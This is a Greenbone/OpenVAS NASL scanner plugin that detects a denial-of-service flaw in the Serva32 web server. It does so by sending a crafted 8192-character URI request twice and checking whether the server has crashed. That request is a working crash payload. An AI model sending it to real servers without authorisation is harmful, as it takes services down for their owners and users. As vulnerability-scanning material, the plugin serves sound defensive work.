# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802020");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-05-23 15:31:07 +0200 (Mon, 23 May 2011)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Serva32 web server Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47760");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17266");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101223");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_mandatory_keys("Serva32/banner");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated attackers to
  cause a denial of service or possibly execute arbitrary code.");

  script_tag(name:"affected", value:"Serva32 1.2.00 RC1, Other versions may also be affected.");

  script_tag(name:"insight", value:"The flaw is caused the way Serva32 web server handles certain requests having
  huge length URI, which causes application to crash.");

  script_tag(name:"solution", value:"Upgrade to Serva32 Version 1.2.1 or later.");

  script_tag(name:"summary", value:"Serva32 web server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.vercot.com/~serva/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

host = http_host_name(port:port);

banner = http_get_remote_headers(port: port);
if("Server: Serva32" >!< banner) {
  exit(0);
}
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: Serva32" >!< res) {
  exit(0);
}

## Send crafted data to server
craftedData = crap(data:"/A", length:8192);
req = string("GET ", craftedData, " HTTP/1.1\r\n", "Host: ", host, "\r\n\r\n");
res = http_send_recv(port:port, data:req);
res = http_send_recv(port:port, data:req);

sleep(2);

## server is died and it's vulnerable
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: Serva32" >!< res) {
  security_message(port:port);
  exit(0);
}

exit(99);
